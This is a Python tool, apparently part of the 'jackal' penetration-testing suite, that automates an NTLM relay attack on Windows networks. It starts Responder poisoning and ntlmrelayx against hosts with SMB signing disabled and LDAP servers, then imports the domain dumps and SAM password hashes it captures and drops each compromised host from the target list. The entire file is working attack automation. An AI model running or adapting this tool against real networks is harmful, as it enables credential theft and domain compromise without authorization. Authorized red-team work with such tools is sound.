#!/usr/bin/env python3
import os
import subprocess
import psutil
import socket
import ipaddress
import argparse
import pyinotify

from jackal import ServiceSearch
from jackal.config import Config
from jackal.utils import print_success, print_notification


class Spoofing(object):
    """
        Spoofing class
        Will start relaying to ldap and smb targets.
        After the domaindump is done the ldap targets are removed.
        After a secretsdump is performed on a target, that target is removed from the targets list.
        If auto_exit is turned on, this program will exit after the targets list is empty.
    """

    def __init__(self, interface_name, ldap, auto_exit, *args, **kwargs):
        self.config = Config()
        self.directory = os.path.join(self.config.config_dir, 'relaying')
        self.output_file = os.path.join(self.directory, 'hashes')
        if not os.path.exists(self.directory):
            os.makedirs(self.directory)

        self.targets_file = os.path.join(self.directory, 'targets.txt')
        self.interface_name = interface_name
        self.search = ServiceSearch(use_pipe=False)
        self.ips = []
        self.ldap_strings = []
        self.ldap = ldap
        self.relay = None
        self.responder = None
        self.notifier = None
        self.processed_files = []

        self.domain_groups_file = ''
        self.domain_users_file = ''

        self.auto_exit = auto_exit


    def load_targets(self):
        """
            load_targets will load the services with smb signing disabled and if ldap is enabled the services with the ldap port open.
        """
        ldap_services = []
        if self.ldap:
            ldap_services = self.search.get_services(ports=[389])

        self.ldap_strings = ["ldap://{}".format(service.address) for service in ldap_services]
        self.services = self.search.get_services(tags=['smb_signing_disabled'])
        self.ips = [str(service.address) for service in self.services]


    def write_targets(self):
        """
            write_targets will write the contents of ips and ldap_strings to the targets_file.
        """
        if len(self.ldap_strings) == 0 and len(self.ips) == 0:
            print_notification("No targets left")
            if self.auto_exit:
                if self.notifier:
                    self.notifier.stop()
                self.terminate_processes()

        with open(self.targets_file, 'w') as f:
            f.write('\n'.join(self.ldap_strings + self.ips))


    def start_processes(self):
        """
            Starts the ntlmrelayx.py and responder processes.
            Assumes you have these programs in your path.
        """
        self.relay = subprocess.Popen(['ntlmrelayx.py','-6', '-tf', self.targets_file, '-w', '-l', self.directory, '-of', self.output_file], cwd=self.directory)
        self.responder = subprocess.Popen(['responder', '-I', self.interface_name])


    def callback(self, event):
        """
            Function that gets called on each event from pyinotify.
        """
        # IN_CLOSE_WRITE -> 0x00000008
        if event.mask == 0x00000008:
            if event.name.endswith('.json'):
                print_success("Ldapdomaindump file found")
                if event.name in ['domain_groups.json', 'domain_users.json']:
                    if event.name == 'domain_groups.json':
                        self.domain_groups_file = event.pathname
                    if event.name == 'domain_users.json':
                        self.domain_users_file = event.pathname
                    if self.domain_groups_file and self.domain_users_file:
                        print_success("Importing users")
                        subprocess.Popen(['jk-import-domaindump', self.domain_groups_file, self.domain_users_file])
                elif event.name == 'domain_computers.json':
                    print_success("Importing computers")
                    subprocess.Popen(['jk-import-domaindump', event.pathname])

                # Ldap has been dumped, so remove the ldap targets.
                self.ldap_strings = []
                self.write_targets()

            if event.name.endswith('_samhashes.sam'):
                host = event.name.replace('_samhashes.sam', '')
                # TODO import file.
                print_success("Secretsdump file, host ip: {}".format(host))
                subprocess.Popen(['jk-import-secretsdump', event.pathname])

                # Remove this system from this ip list.
                self.ips.remove(host)
                self.write_targets()


    def watch(self):
        """
            Watches directory for changes
        """
        wm = pyinotify.WatchManager()
        self.notifier = pyinotify.Notifier(wm, default_proc_fun=self.callback)
        wm.add_watch(self.directory, pyinotify.ALL_EVENTS)
        try:
            self.notifier.loop()
        except (KeyboardInterrupt, AttributeError):
            print_notification("Stopping")
        finally:
            self.notifier.stop()
            self.terminate_processes()


    def terminate_processes(self):
        """
            Terminate the processes.
        """
        if self.relay:
            self.relay.terminate()
        if self.responder:
            self.responder.terminate()


    def wait(self):
        """
            This function waits for the relay and responding processes to exit.
            Captures KeyboardInterrupt to shutdown these processes.
        """
        try:
            self.relay.wait()
            self.responder.wait()
        except KeyboardInterrupt:
            print_notification("Stopping")
        finally:
            self.terminate_processes()


def main():
    interface_name = get_interface_name()
    argparser = argparse.ArgumentParser(description="Tool to start relaying and stuff.")
    argparser.add_argument('--no-ldap', help='Disable relaying to ldap.', action='store_true')
    argparser.add_argument('--interface', help='Interface to use, default: {}'.format(interface_name), \
        type=str, default=interface_name)
    argparser.add_argument('--auto-exit', help='Exit after all targets have been exploited.', action='store_true')

    arguments = argparser.parse_args()
    spoofing = Spoofing(arguments.interface, not arguments.no_ldap, arguments.auto_exit)
    print_notification("Started processes, if these crash maybe run as root?")
    spoofing.load_targets()
    spoofing.write_targets()
    spoofing.start_processes()
    print_notification("Spoofing starting, press Ctrl-C to quit.")
    spoofing.watch()
    print_notification("Exiting")


def get_interface_name():
    """
        Returns the interface name of the first not link_local and not loopback interface.
    """
    interface_name = ''
    interfaces = psutil.net_if_addrs()
    for name, details in interfaces.items():
        for detail in details:
            if detail.family == socket.AF_INET:
                ip_address = ipaddress.ip_address(detail.address)
                if not (ip_address.is_link_local or ip_address.is_loopback):
                    interface_name = name
                    break
    return interface_name


if __name__ == '__main__':
    main()
